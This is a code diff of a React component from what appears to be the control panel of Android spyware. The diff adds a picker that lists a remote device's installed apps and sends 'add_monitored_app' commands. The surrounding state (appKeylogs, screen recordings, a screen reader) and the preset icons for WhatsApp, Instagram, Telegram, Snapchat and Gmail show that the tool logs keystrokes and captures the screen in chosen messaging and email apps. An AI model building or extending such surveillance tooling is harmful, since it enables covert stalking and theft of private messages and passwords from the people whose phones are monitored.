@@ -67,6 +67,7 @@ export default function AppMonitorTab({ device, sendCommand, results, screenRead
   const devH     = info.screenHeight || 2340;
 
   const [monitoredApps, setMonitoredApps] = useState([]);
+  const [installedApps, setInstalledApps]   = useState([]);
   const [selectedApp, setSelectedApp]     = useState(null);
   const [view, setView]                   = useState('recorder');
   const [appKeylogs, setAppKeylogs]       = useState([]);
@@ -76,14 +77,10 @@ export default function AppMonitorTab({ device, sendCommand, results, screenRead
   const [previewImage, setPreviewImage]   = useState(null);
   const seenIds = useRef(new Set());
 
-  const [isRecording, setIsRecording]     = useState(false);
-  const [currentFrames, setCurrentFrames] = useState([]);
-  const [recordings, setRecordings]       = useState([]);
-  const [playing, setPlaying]             = useState(null);
-  const [playIdx, setPlayIdx]             = useState(0);
-  const [isPlaying, setIsPlaying]         = useState(false);
-  const [playSpeed, setPlaySpeed]         = useState(500);
-  const [readerActive, setReaderActive]   = useState(false);
+  const [showAddAppModal, setShowAddAppModal] = useState(false);
+  const [addAppManual, setAddAppManual]       = useState('');
+  const [addAppSearch, setAddAppSearch]       = useState('');
+  const [addAppSelecting, setAddAppSelecting] = useState('list');
 
   const isRecordingRef  = useRef(false);
   const framesRef       = useRef([]);
@@ -97,6 +94,10 @@ export default function AppMonitorTab({ device, sendCommand, results, screenRead
     sendCommand(deviceId, 'list_app_monitor_apps', {});
   }, [deviceId, sendCommand]);
 
+  const fetchInstalledApps = useCallback(() => {
+    sendCommand(deviceId, 'get_installed_apps', {});
+  }, [deviceId, sendCommand]);
+
   // Monitored apps are loaded manually via the Refresh button
 
   useEffect(() => {
@@ -106,8 +107,13 @@ export default function AppMonitorTab({ device, sendCommand, results, screenRead
       seenIds.current.add(r.id);
       try {
         const data = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
-        switch (r.command) {
-          case 'list_app_monitor_apps': {
+switch (r.command) {
+            case 'get_installed_apps': {
+              const apps = data.apps || data.installedApps || [];
+              setInstalledApps(Array.isArray(apps) ? apps : []);
+              break;
+            }
+            case 'list_app_monitor_apps': {
             const configured = data.configured || [];
             const stored = data.stored || [];
             const merged = [...configured];
@@ -306,13 +312,23 @@ export default function AppMonitorTab({ device, sendCommand, results, screenRead
         <div className="amt-sidebar">
           <div className="amt-sidebar-header">
             <span>📡 Monitored Apps</span>
-            <button className="kl-btn" onClick={fetchMonitoredApps} disabled={!isOnline}>↻</button>
+            <div style={{ display: 'flex', gap: 6, alignItems: 'center' }}>
+              <button
+                className="kl-btn"
+                onClick={() => { setShowAddAppModal(true); setAddAppSelecting('list'); fetchInstalledApps(); }}
+                disabled={!isOnline}
+                title="Add app to monitor (picker or manual)"
+              >
+                ➕ Add App
+              </button>
+              <button className="kl-btn" onClick={fetchMonitoredApps} disabled={!isOnline}>↻</button>
+            </div>
           </div>
           {monitoredApps.length === 0 && (
             <div className="amt-empty">
               <div style={{ fontSize: 28 }}>📡</div>
               <div style={{ fontSize: 12 }}>No monitored apps</div>
-              <div style={{ fontSize: 11, color: '#475569' }}>Add packages to Constants.java</div>
+              <div style={{ fontSize: 11, color: '#475569' }}>Use ➕ Add App to start monitoring</div>
             </div>
           )}
           {monitoredApps.map(app => (
@@ -657,6 +673,86 @@ export default function AppMonitorTab({ device, sendCommand, results, screenRead
             <div className="modal-actions">
               <button className="btn-secondary" onClick={() => setPreviewImage(null)}>Close</button>
               <button className="btn-primary" onClick={downloadPreviewImage}>⬇ Download</button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Add App Modal */}
+      {showAddAppModal && (
+        <div className="modal-overlay" onClick={() => { setShowAddAppModal(false); setAddAppManual(''); setAddAppSearch(''); }}>
+          <div className="modal-box" style={{ maxWidth: 420, maxHeight: '80vh' }} onClick={e => e.stopPropagation()}>
+            <div className="modal-title">➕ Add App to Monitor</div>
+            <div style={{ display: 'flex', gap: 8, marginBottom: 12, borderBottom: '1px solid var(--border)', paddingBottom: 8 }}>
+              <button className={`kl-btn ${addAppSelecting === 'list' ? 'active' : ''}`} onClick={() => setAddAppSelecting('list')}>📱 Installed Apps</button>
+              <button className={`kl-btn ${addAppSelecting === 'manual' ? 'active' : ''}`} onClick={() => setAddAppSelecting('manual')}>✏️ Manual Entry</button>
+            </div>
+
+            {addAppSelecting === 'list' ? (
+              <div style={{ maxHeight: 400, overflowY: 'auto' }}>
+                <input
+                  className="kl-file-modal-search"
+                  placeholder="Search installed apps…"
+                  value={addAppSearch}
+                  onChange={e => setAddAppSearch(e.target.value)}
+                  autoFocus
+                />
+                {installedApps.length === 0 && (
+                  <div className="amt-empty" style={{ padding: 20, fontSize: 12 }}>No installed apps loaded. Click ➕ Add App again to fetch.</div>
+                )}
+                {installedApps
+                  .filter(app => {
+                    const q = addAppSearch.toLowerCase();
+                    return !q || (app.name || '').toLowerCase().includes(q) || (app.packageName || '').toLowerCase().includes(q);
+                  })
+                  .slice(0, 200)
+                  .map(app => (
+                    <button
+                      key={app.packageName}
+                      className="amt-add-app-btn"
+                      onClick={() => { sendCommand(deviceId, 'add_monitored_app', { packageName: app.packageName }); fetchMonitoredApps(); setShowAddAppModal(false); }}
+                      disabled={!isOnline}
+                      style={{ display: 'flex', alignItems: 'center', gap: 10, width: '100%', padding: '10px 12px', background: 'var(--bg-primary)', border: '1px solid var(--border)', borderRadius: 8, textAlign: 'left', cursor: 'pointer', marginTop: 6, color: 'var(--text-primary)' }}
+                    >
+                      <span style={{ fontSize: 20 }}>{app.packageName === 'com.whatsapp' ? '💬' : app.packageName === 'com.instagram.android' ? '📸' : app.packageName === 'com.facebook.katana' ? '👤' : app.packageName === 'org.telegram.messenger' ? '✈️' : app.packageName === 'com.snapchat.android' ? '👻' : app.packageName === 'com.zhiliaoapp.musically' ? '🎵' : app.packageName === 'com.twitter.android' ? '🐦' : app.packageName === 'com.google.android.gm' ? '📧' : app.packageName === 'com.google.android.chrome' ? '🌐' : app.packageName === 'com.google.android.youtube' ? '▶️' : '📦'}</span>
+                      <div style={{ flex: 1, minWidth: 0 }}>
+                        <div style={{ fontWeight: 600, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{app.name || app.appName || '—'}</div>
+                        <div style={{ fontSize: 11, color: '#64748b', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{app.packageName}</div>
+                      </div>
+                      <span style={{ fontSize: 10, color: '#22c55e', background: 'rgba(34,197,94,0.12)', padding: '2px 6px', borderRadius: 4 }}>Add</span>
+                    </button>
+                  ))}
+              </div>
+            ) : (
+              <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
+                <input
+                  className="kl-file-modal-search"
+                  placeholder="Enter package name (e.g. com.example.app)"
+                  value={addAppManual}
+                  onChange={e => setAddAppManual(e.target.value.trim())}
+                  autoFocus
+                />
+                <div style={{ display: 'flex', gap: 8, justifyContent: 'flex-end' }}>
+                  <button className="kl-btn" onClick={() => { setShowAddAppModal(false); setAddAppManual(''); }}>Cancel</button>
+                  <button className="kl-btn" style={{ background: '#7c3aed', color: 'white', border: 'none' }}
+                    onClick={() => {
+                      const pkg = addAppManual.trim();
+                      if (pkg) {
+                        sendCommand(deviceId, 'add_monitored_app', { packageName: pkg });
+                        fetchMonitoredApps();
+                        setShowAddAppModal(false);
+                        setAddAppManual('');
+                      }
+                    }}
+                    disabled={!isOnline || !addAppManual.trim()}
+                  >
+                    Add App
+                  </button>
+                </div>
+              </div>
+            )}
+            <div className="modal-actions" style={{ marginTop: 16, display: 'flex', justifyContent: 'flex-end' }}>
+              <button className="kl-btn" onClick={() => { setShowAddAppModal(false); setAddAppManual(''); setAddAppSearch(''); }}>Cancel</button>
             </div>
           </div>
         </div>
